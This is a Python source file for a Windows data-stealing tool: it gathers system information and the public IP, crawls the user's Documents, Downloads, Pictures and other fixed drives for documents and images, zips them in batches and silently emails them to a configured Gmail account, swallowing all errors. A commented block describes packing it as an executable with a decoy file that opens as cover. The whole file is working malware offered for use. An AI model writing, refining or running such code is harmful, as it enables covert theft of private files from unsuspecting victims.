# -*- coding: utf-8 -*-
"""
Created on Mon May 22 15:12:34 2023

@author: yego21
"""
import subprocess
import os
import smtplib
import re
import tempfile
import sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


class Getter:

    def __init__(self):
        self.get_dirs()
        self.set_mime_parameter()
        self.doc_file_types = ["doc", "docm", "docx", "txt", "dotx", "eml", "pdf", "ppt", "pptx", "rtf"]
        self.graphic_file_types = ["jpg", "jpeg", "psd", "png", "heic", "raw"]
        self.get_sys_info()
        self.temp_dir = tempfile.gettempdir()

    def get_other_drives(self):
        drive_result = subprocess.check_output("wmic logicaldisk get deviceid, description", shell=True,
                                               stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        # print(drive_result.decode())
        drive_list = re.findall("(?:Local Fixed Disk\s*)(.):", drive_result.decode())
        drive_list.remove("C")
        # drive_list.remove("D")
        # drive_list.remove("E")
        # drive_list.remove("F")
        # drive_list.remove("G")
        return drive_list

    def set_mime_parameter(self):
        self.msg = MIMEMultipart()
        self.msg['Subject'] = "Email from: " + self.uid
        self.msg['From'] = self.uid
        self.msg['To'] = ""

    def send_mail(self, email, password, message):
        self.server = smtplib.SMTP("smtp.gmail.com", 587)
        self.server.starttls()
        self.server.login(email, password)
        self.server.sendmail(email, email, message)

    def mime_obj(self, content, file_name):
        file = MIMEBase('application', 'octet-stream')
        file.set_payload(content.read())
        encoders.encode_base64(file)
        file.add_header('Content-Disposition', "attachment; filename = " + file_name)
        self.msg.attach(file)

    def get_sys_info(self):
        attach_info = ""
        system_info = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL,
                                              stdin=subprocess.DEVNULL)
        ip_info = subprocess.check_output("nslookup myip.opendns.com resolver1.opendns.com", shell=True,
                                          stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        attach_info = system_info.decode() + ip_info.decode()
        self.msg.attach(MIMEText(attach_info, 'plain'))

    def get_dirs(self):
        self.uid = os.getlogin()

        documents = "C:/Users/" + self.uid + "/Documents/"
        downloads = "C:/Users/" + self.uid + "/Downloads/"
        pictures = "C:/Users/" + self.uid + "/Pictures/"
        D = "D:"
        E = "E:"
        F = "F:"
        G = "G:"
        H = "H:"
        I = "I:"
        path_dict = {"Documents": documents, "Downloads": downloads, "Pictures": pictures, "D": D, "E": E, "F": F,
                     "G": G, "H": H, "I": I}

        return path_dict

    def check_files(self, file_directory):

        os.chdir(self.get_dirs().get(file_directory))
        check_all_files = subprocess.check_output("dir /s /b /o:gn", shell=True, stderr=subprocess.DEVNULL,
                                                  stdin=subprocess.DEVNULL)

        # print(check_all_files.decode('cp1252'))
        found_files = re.findall("(?:" + file_directory + ".)(.*\..*)", check_all_files.decode(errors="ignore"))
        # print(found_files)
        return found_files

    def check_file_size(self, file_path):
        file_path = file_path.replace("/", "\\")
        result = subprocess.check_output('dir "' + file_path + '"', shell=True, stderr=subprocess.DEVNULL,
                                         stdin=subprocess.DEVNULL)
        file_size = re.findall("(?:File\(s\)\s*)(.*)bytes", result.decode())
        for size in file_size:
            size = size.replace(",", "")
        return int(size)

    def read_file(self, path):
        try:
            attachment = open(path, "rb")
            return attachment
        except PermissionError:
            return None

    def zip_and_email(self, my_file_string, file_name, dts, file_types):
        try:
            zip_name = file_types + "_from_" + dts + ".zip"
            zip_path = self.temp_dir + "\\" + zip_name
            # print(my_file_string)
            # print(zip_path)
            subprocess.call("tar -a -c -f " + zip_path + " " + my_file_string, stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL)
            file_data = self.read_file(zip_path)
            # print(file_data)
            # print("[~] Sending zip as email...Please wait.")
            self.mime_obj(file_data, zip_name)
            file_data = None
            os.remove(zip_path)
            try:
                # ---- ENTER THE EMAIL YOU WANT TO USE FOLLOWED BY THE APP PASSWORD ----
                self.send_mail("%YOUR_EMAIL_HERE%", "%YOUR_APP_PASSWORD%", self.msg.as_string())
                self.set_mime_parameter()
            except Exception:
                self.set_mime_parameter()
                pass

        except Exception:
            # print(traceback.format_exc())
            pass

    def run(self):
        dirs_to_scan = ["Documents", "Downloads", "Pictures"]
        for drives in self.get_other_drives():
            dirs_to_scan.append(str(drives))
            # print(dirs_to_scan)

        my_gfile_string = ""
        my_file_string = ""
        append_gzip_name = 0
        append_zip_name = 0
        for dts in dirs_to_scan:
            full_file_path_result = self.check_files(dts)
            gtotal_size = 0
            total_size = 0
            count = 0

            for i in range(len(full_file_path_result)):
                count += 1
                file_length_count = len(full_file_path_result)
                try:
                    full_file_path_result[i] = full_file_path_result[i].replace("\r", "")
                    file_name = full_file_path_result[i].split("\\")[-1]

                    ext = re.search("....\Z", file_name)

                    for gtypes in self.graphic_file_types:
                        if gtypes in ext.group():
                            if gtypes != "jpg" or ext.group() != "jpeg":
                                data = self.get_dirs().get(dts) + full_file_path_result[i]
                                if gtotal_size < 15000000:
                                    gcurrent_size = self.check_file_size(data)
                                    gtotal_size = gtotal_size + gcurrent_size
                                    if gtotal_size and gcurrent_size < 20000000:
                                        my_gfile_string = my_gfile_string + '"' + data + '"' + " "
                                        # print(data)
                                        # print(gtotal_size)
                                else:
                                    append_gzip_name = append_gzip_name + 1
                                    self.zip_and_email(my_gfile_string, file_name, dts,
                                                       "ImgFiles(" + str(append_gzip_name) + ")")

                                    my_gfile_string = ""
                                    gtotal_size = 0

                    for dtypes in self.doc_file_types:
                        if dtypes in ext.group():
                            if dtypes != "doc" or ext.group() != "docx":
                                data = self.get_dirs().get(dts) + full_file_path_result[i]

                                if total_size < 15000000:
                                    current_size = self.check_file_size(data)
                                    total_size = total_size + current_size

                                    if total_size and current_size < 20000000:
                                        my_file_string = my_file_string + '"' + data + '"' + " "
                                        # print(data)
                                else:
                                    append_zip_name = append_zip_name + 1
                                    self.zip_and_email(my_file_string, file_name, dts,
                                                       "DocFiles(" + str(append_gzip_name) + ")")

                                    my_file_string = ""
                                    total_size = 0

                except Exception:
                    # print(traceback.format_exc())
                    continue

                finally:
                    try:
                        if count == file_length_count:
                            self.zip_and_email(my_gfile_string, file_name, dts,
                                               "ImgFiles(" + str(append_gzip_name) + ")")
                            self.zip_and_email(my_file_string, file_name, dts,
                                               "DocFiles(" + str(append_gzip_name) + ")")
                            my_gfile_string = ""
                            gtotal_size = 0
                            my_file_string = ""
                            total_size = 0
                            append_gzip_name = 0
                            append_zip_name = 0
                    except Exception:
                        # print(traceback.format_exc())
                        my_gfile_string = ""
                        gtotal_size = 0
                        my_file_string = ""
                        total_size = 0
                        append_gzip_name = 0
                        append_zip_name = 0
                        continue

        self.server.quit()
        sys.exit()
        # print("DONE")


# --- UNCOMMENT THE LINES BELOW IF YOU WANT TO USE A FRONT FILE THAT WILL OPEN WHILE EXECUTING THIS SCRIPT AS EXECUTABLE (use command "--add-data" while repacking)----
# front_file = sys._MEIPASS + %FILE_NAME_HERE%
# subprocess.Popen(front_file, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


try:
    my_get = Getter()
    my_get.run()

except Exception:
    sys.exit()


